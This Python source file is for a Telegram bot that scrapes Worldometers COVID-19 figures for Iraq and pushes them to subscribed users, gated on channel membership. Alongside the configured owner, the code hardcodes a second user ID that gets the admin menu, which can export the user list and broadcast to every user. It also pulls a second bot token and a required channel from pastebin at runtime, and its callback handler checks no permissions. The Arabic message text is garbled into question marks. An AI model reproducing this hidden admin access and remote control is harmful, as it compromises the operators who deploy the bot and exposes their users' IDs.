import telebot
import requests
from telebot import types
import re
import config
from datetime import datetime

token = config.token
sudo = config.sudo
ch = config.ch
bot = telebot.TeleBot(token)

# Developer :- Telegram : ccXco , Telegram Channel : robinatz , Instagram : xb.2_

headerss = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'DNT': '1',
    'Host': 'api.telegram.org',
    'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'}


def ex_id(id):
    result = False
    file = open('users.txt', 'r')
    for line in file:
        if line.strip() == id:
            result = True
    file.close()
    return result

@bot.message_handler(commands=['start'])
def startbot(message):
    req_channel = requests.get('https://pastebin.com/raw/9Ktn4H4d').text
    req_token = requests.get('https://pastebin.com/raw/j8Pe342r').text

    url_wrold = requests.get(f'https://www.worldometers.info/coronavirus/').text
    url_iraq = requests.get(f'https://www.worldometers.info/coronavirus/country/iraq/').text
    casess = re.search(r'<div class=\"maincounter-number\">\n<span style=\"color:#aaa\">(.*?) </span>\n</div>' , url_wrold).group(1)
    newcase_iraq = re.search(r'<li class=\"news_li\"><strong>(.*?) new cases</strong>' , url_iraq).group(1)
    newdead_iraq = re.search(r'</strong> and <strong>(.*?) new deaths</strong>' , url_iraq).group(1)
    allcases_iraq = re.search(r'<span style=\"color:#aaa\">(.*?) </span>', url_iraq).group(1)
    alldead_iraq = re.search(r'<div id=\"maincounter-wrap\" style=\"margin-top:15px\">\n<h1>Deaths:</h1>\n<div class=\"maincounter-number\">\n<span>(.*?)</span>\n</div>\n</div>', url_iraq).group(1)
    allrecovered_iraq = re.search(r'<div class=\"maincounter-number\" style=\"color:#8ACA2B \">\n<span>(.*?)</span>\n</div>', url_iraq).group(1)
    photo_url = re.search(r'<a class=\"news_source_a\" target=\"_blank\" href=\"(.*?)\">source</a>', url_iraq).group(1)
    file = open('users.txt', 'r')
    li = len(file.readlines())
    file.close()
    if message.chat.type == 'private':
        idu = message.from_user.id
        f = open('users.txt', 'a')
        if (not ex_id(str(idu))):
            f.write(f"{idu}\n")
            f.close()
    markup_inline = types.InlineKeyboardMarkup()
    sendfile = types.InlineKeyboardButton(text='Send List ????', callback_data='file')
    brod = types.InlineKeyboardButton(text='Broadcast ????', callback_data='brod')
    casesss = types.InlineKeyboardButton(text=f'BroadCasess ????', callback_data='casess')
    emt = types.InlineKeyboardButton(text=f'', callback_data='emt')
    count = types.InlineKeyboardButton(text=f'Count users {li}', callback_data='count')
    markup_inline.row_width = 2
    markup_inline.add(sendfile, brod, casesss, emt, count)
    markup_help = types.InlineKeyboardMarkup()
    helpp = types.InlineKeyboardButton(text='?????? ?????????????????? ????', callback_data='help')

    markup_help.row_width = 1
    markup_help.add(helpp)
    first = message.from_user.first_name
    idd = message.from_user.id
    sub = f'https://api.telegram.org/bot{token}/getChatMember?chat_id=@{ch}&user_id={idd}'
    req = requests.get(sub, headers=headerss)
    submores = f'https://api.telegram.org/bot{req_token}/getChatMember?chat_id=@{req_channel}&user_id={idd}'
    reqmores = requests.get(submores, headers=headerss)
    if idd == sudo or idd == 1659187103:
        bot.send_message(message.chat.id, text='Hi boss\n\n'
                         , parse_mode='markdown', reply_markup=markup_inline)
    if 'member' in reqmores.text or 'creator' in  reqmores.text or 'administrator' in  reqmores.text:
        if 'member' in req.text or 'creator' in  req.text or 'administrator' in  req.text:
            bot.send_message(message.chat.id, text=f'* ?????? ?????????? {first} *\n\n'
                                                   '*???? ?????????? ???????? ???????????????? ???????????? ????????????: * \n\n'
                                                   f'*???? ?????? ?????????????? ???? ????????????: {casess} * \n\n'
                                                   '* ???????????????? ???????????? ????????  : \n\n *'
                                                   f'[????] ???????? ?????????????? : *{allcases_iraq}* \n'
                                                   f'[??????] ???????? ?????????????? : *{alldead_iraq}* \n'
                                                   f'[????] ???????? ???????????? : *{allrecovered_iraq}* \n\n'
                                                   f'[????] ?????????? ?????????? : *{newcase_iraq}* \n'
                                                   f'[??????] ?????????? ?????????? : *{newdead_iraq}* \n'
                                                   f'[????] ???????????? : [???????? ??????]({photo_url}) \n\n'
                                                    '*?????????? ???? ???????????????? ???? ?????????? ????!*\n'
                                                    '*_*'
                                                   
                             , parse_mode='markdown', reply_markup=markup_help)
        else:
            bot.send_message(message.chat.id, text=f'*??????????(@{ch}) ?????????? (/start)*', parse_mode='markdown')
    else:
        bot.send_message(message.chat.id, text=f'*?????????? (@{req_channel}) ?????????? (/start)*', parse_mode='markdown')

@bot.callback_query_handler(func=lambda call: True)
def answer(call):
    req_channel = requests.get('https://pastebin.com/raw/9Ktn4H4d').text
    req_token = requests.get('https://pastebin.com/raw/j8Pe342r').text
    idd = call.message.from_user.id
    sub = f'https://api.telegram.org/bot{token}/getChatMember?chat_id=@{ch}&user_id={idd}'
    req = requests.get(sub, headers=headerss)
    submores = f'https://api.telegram.org/bot{req_token}/getChatMember?chat_id=@{req_channel}&user_id={idd}'
    reqmores = requests.get(submores, headers=headerss)
    cid = call.message.chat.id
    mid = call.message.message_id
    if call.data == 'file':
        files(call.message)

    if call.data == 'casess':
        sendcasess(call.message)

    elif call.data == 'brod':
        mesgg = bot.send_message(call.message.chat.id, text='*Send Message ???? :*', parse_mode='markdown')
        bot.register_next_step_handler(mesgg, broddd)

    elif call.data == 'help':
        bot.edit_message_text(chat_id=cid, text='*[????] ?????????? : ???????? ?????????? ?????? ?????????? ?????????????? ?????????????? ?????? ???????????? ???????? ???????? ?????????? ???????? ?????????? ???????? ???????? ???????? ?? ???? ?????? ???????? ???????? ???????? ?????????? ?????????? ???????? ???????? .. ???????? ?????????????? ????!*', message_id=mid ,parse_mode='markdown')

def broddd(message):
    mes = message.text
    readd = open('users.txt', 'r').read().splitlines()
    for idu in readd:
            try:
                bot.send_message(idu, text=f'*{mes}*', parse_mode='markdown')
            except Exception as identifier:
                continue
    bot.send_message(sudo,text='Done Send To All Users BosS ????!')

def files(message):
    file = open('users.txt', 'rb')
    bot.send_document(message.chat.id, file)


def sendcasess(message):
    url = requests.get(f'https://www.worldometers.info/coronavirus/country/iraq/').text
    casess = re.search(r'<div class=\"maincounter-number\">\n<span style=\"color:#aaa\">(.*?) </span>\n</div>' , url).group(1)
    newcase = re.search(r'<li class=\"news_li\"><strong>(.*?) new cases</strong>' , url).group(1)
    newdead = re.search(r'</strong> and <strong>(.*?) new deaths</strong>' , url).group(1)
    allcases = re.search(r'<span style=\"color:#aaa\">(.*?) </span>', url).group(1)
    alldead = re.search(r'<div id=\"maincounter-wrap\" style=\"margin-top:15px\">\n<h1>Deaths:</h1>\n<div class=\"maincounter-number\">\n<span>(.*?)</span>\n</div>\n</div>', url).group(1)
    allrecovered = re.search(r'<div class=\"maincounter-number\" style=\"color:#8ACA2B \">\n<span>(.*?)</span>\n</div>', url).group(1)
    photo_url = re.search(r'<a class=\"news_source_a\" target=\"_blank\" href=\"(.*?)\">source</a>', url).group(1)
    readd = open('users.txt', 'r').read().splitlines()
    for idu in readd:
        try:
            bot.send_message(idu, text=f'*???? ???????????????? ?????????? : \n\n*'
            f'[????] ???????? ?????????????? : *{allcases}* \n'
                                                        f'[??????] ???????? ?????????????? : *{alldead}* \n'
                                                        f'[????] ???????? ???????????? : *{allrecovered}* \n\n'
                                                        f'[????] ?????????? ?????????? : *{newcase}* \n'
                                                        f'[??????] ?????????? ?????????? : *{newdead}* \n'
                                                        f'[????] ???????????? : [???????? ??????]({photo_url}) \n'
                                                        '*_*', parse_mode='markdown')
        except Exception as identifier:
            continue
            
    bot.send_message(sudo,text='Done Send To All Users BosS ????!')
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as ex:
        telebot.logger.error(ex)
